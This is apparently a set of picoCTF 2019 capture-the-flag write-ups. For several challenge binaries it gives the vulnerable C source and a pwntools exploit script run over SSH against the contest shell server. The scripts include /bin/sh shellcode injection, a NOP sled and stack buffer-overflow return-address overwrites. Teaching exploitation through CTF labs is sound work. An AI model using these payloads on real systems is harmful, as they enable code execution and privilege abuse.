### Handy-shellcode

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

We have to enter a shellcode and the binary will run it, so I'll create a shellcode with pwntools and send it:

```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("cd /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 && ./vuln")

payload = asm(shellcraft.linux.sh())

p.recvuntil("Enter your shellcode:")
p.sendline(payload)
p.sendline(b"cat flag.txt")
p.interactive()
```
### Practice-run-1

You only have to run the binary to get the flag

```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e/run_this")

print(p.recvline())
```

### Overflow 0

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```

Here we see that is sending the argv to the function `vuln`, we can overflow the `buf` variable, and cause a segmentation fault, and then `sigsegv_handler` will print the flag:

```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("sh")

p.sendline("cd /problems/overflow-0_3_dc6e55b8358f1c82f03ddd018a5549e0")
p.sendline("./vuln" + " " + "a"*200)
p.interactive()
```

### Overflow 1

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

Here we see that `main` calls the function `vuln` that uses `gets` so it's vulnerable to a buffer overflow, and then it's using `get_return_address`, we can overflow the `buf` variable and then send the `flag` address and get the flag:

We can use `objdump` to get the address:

```bash
objdump -d vuln | grep flag
080485e6 <flag>:
 8048618:       75 1c                   jne    8048636 <flag+0x50>
```

And the exploit:

```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("cd /problems/overflow-1_3_f08d494c74b95dae41bff71c2a6cf389 && ./vuln")

payload = b"a"*76
payload += p32(0x080485e6)

p.recvuntil(": ")
p.sendline(payload)
p.interactive()
```

### NewOverFlow-1

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

We can overflow `buf` and jump to the `flag` function to get the flag. First I tried: `padding` + `flag_addr`, but it didn't work after searching, I found that it was because the stack alignment ant he solution was to call `main` after the padding:
 
```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("cd /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123 && ./vuln")

payload = b"a"*64 + b"a"*8
payload += p64(0x4007e8)
payload += p64(0x400767)

p.recvuntil(":")
p.sendline(payload)
p.interactive()
```

### Slippery-shellcode

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

Here we see that `main` calls `vuln` that uses `gets` with  `buf`, so we know we can overflow it. Then it jumps to a random address of the binary between the first 256 bytes of `buf`.

We can send 256 NOPs and then the shellcode, using the nops we know that the shellcode is going to be executed. 

```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("cd /problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015 && ./vuln")

payload = b"\x90" * 256
payload += asm(shellcraft.linux.sh())

p.recvuntil(":")
p.sendline(payload)
p.sendline(b"cat flag.txt")
p.interactive()
```

### Overflow 2

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

`main` calls `vuln` that uses `gets`, so we know it's vulnerable to a buffer overflo, then we see the flag function has a condition that if the `arg1 == 0xDEADBEEF` and `arg2 == 0xC0DED00D` it prints the flag, so we can overflow call the flag function, and the return address and the two arguments:

```python
from pwn import *
from getpass import getpass

user = getpass("Username:")
passwd = getpass("Password:")
host = "2019shell1.picoctf.com"

s = ssh(user=user,password=passwd,host=host)
p = s.run("cd /problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e && ./vuln")

payload = b"a"*188
payload += p32(0x080485e6)
payload += b"aaaa"
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)

p.recvuntil(":")
p.sendline(payload)
p.interactive()
```

